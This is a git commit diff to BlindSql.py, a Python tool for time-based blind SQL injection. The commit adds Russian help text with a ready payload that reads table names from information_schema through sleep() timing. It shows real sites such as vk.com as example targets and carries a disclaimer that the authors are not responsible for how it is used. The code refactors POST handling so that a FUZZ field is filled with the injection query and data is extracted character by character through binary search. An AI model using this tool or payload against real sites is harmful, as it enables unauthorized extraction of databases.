8525efb68ee75aca18354e1fc1112c0f9b926b9e
dms <dimisi.arh@gmail.com>
2022-09-14 22:23:26 +0700

    Add help and refactor post-request

--- BlindSql.py
+++ BlindSql.py
@@ -4,17 +4,37 @@ from datetime import timedelta
 
 
 def createParser():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-u', "--url")
-    parser.add_argument("-q", "--query")
-    parser.add_argument("-d", "--data", default=None)
-    #    parser.add_argument("-h", "--help")
-    parser.add_argument("-H", "--headers", default=None)
+    parser = argparse.ArgumentParser(prog="BlindSQL by Dimisi",
+                                     description="Скуля крутится, инфобез мутится."
+                                                 "Программа используется либо для get либо для post и никогда для того и другого разом.",
+                                     epilog='''(C) DMS, Жора и SavinDaniil 2022. За то, как и кто будет использовать
+                                                программу ответсственности не несём. Пистолет это просто пистолет, 
+                                                на спусковой крючок жмёт человек.''')
+
+    parser.add_argument('-u', "--url", help="example: https://yandex.ru. Для инъекции в get-запросе не указываем ключ -d"
+                                            " и подставляем в url уязвимый параметр со значением FUZZ. Example:"
+                                            " https://vk.com/id=FUZZ")
+
+    parser.add_argument("-q", "--query", help='''Используем произвольный time-based SQL-запрос который должен вернуть ИСТИНУ или ЛОЖЬ 
+                                                 с обязательной подстановкой в него переменных [INDEX],[ZNAK],[MID] где:
+                                                  INDEX - позиция символа в строке, ZNAK - < > = для алгоритма бинарного поиска, 
+                                                  MID - средняя позиция в алгоритме бинарного поиска. Скрипт сам будет заменять
+                                                  переменные на нужные значения.
+                                                  \n Example: 1' AND IF(ascii(substr((SELECT TABLE_NAME FROM 
+                                                  information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),
+                                                  [INDEX],1))[ZNAK][MID],sleep(2),NULL)-- -
+                                                  Значение функции sleep() должно быть не меньше единицы.''')
+
+    parser.add_argument("-d", "--data", default=None, help='''Передаём одной строкой как заголовки, с переменной FUZZ 
+                                                           в уязвимом параметре. Example: "name: FUZZ | password: admin | action: submit"''')
+
+    parser.add_argument("-H", "--headers", default=None, help='''Передача заголовков происходит в одну строку 
+                                                              с разделителем "|". Example: "Accept: grip, image | User-Agent: Mozila-Firefox, geeko[996]"''')
 
     return parser
 
 
-def blind_query(char_index, mid, znak, namespace, headers):
+def blind_query(char_index, mid, znak):
     #  a = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)
     # print(a)
     # print(namespace.data)
@@ -27,7 +47,8 @@ def blind_query(char_index, mid, znak, namespace, headers):
         else:
             raise
     else:
-        resp = requests.post(url=namespace.url, data={namespace.data: query}, headers=headers)
+        post_data[fuzz_key] = query
+        resp = requests.post(url=namespace.url, data=post_data, headers=headers)
 
     requtime = resp.elapsed
     resp.close()
@@ -37,17 +58,17 @@ def blind_query(char_index, mid, znak, namespace, headers):
         return False
 
 
-def reqursion_find(start, end, char_index, namespace, headers):
+def reqursion_find(start, end, char_index):
     if start > end:
         return -1
     mid = (start + end) // 2
-    if blind_query(char_index=char_index, mid=mid, znak="=", namespace=namespace, headers=headers):
+    if blind_query(char_index=char_index, mid=mid, znak="="):
         return mid
 
-    if blind_query(char_index=char_index, mid=mid, znak="<", namespace=namespace, headers=headers):
-        return reqursion_find(start, mid - 1, char_index=char_index, namespace=namespace, headers=headers)
+    if blind_query(char_index=char_index, mid=mid, znak="<"):
+        return reqursion_find(start, mid - 1, char_index=char_index)
     else:
-        return reqursion_find(mid + 1, end, char_index=char_index, namespace=namespace, headers=headers)
+        return reqursion_find(mid + 1, end, char_index=char_index)
 
 
 def strToDict(string=str()):
@@ -91,9 +112,16 @@ if __name__ == "__main__":
     else:
         headers = strToDict(headers[0])
 
+    post_data = strToDict(str(namespace.data[0]))
+
+    fuzz_key = ""
+    for key in post_data:
+        if post_data[key] == "FUZZ":
+            fuzz_key = key
+
     final_str = ""
     for i in range(1, 75):
-        char = reqursion_find(32, 126, i, namespace, headers)
+        char = reqursion_find(32, 126, i)
         if char == -1:
             print("work finish")
             print(final_str)
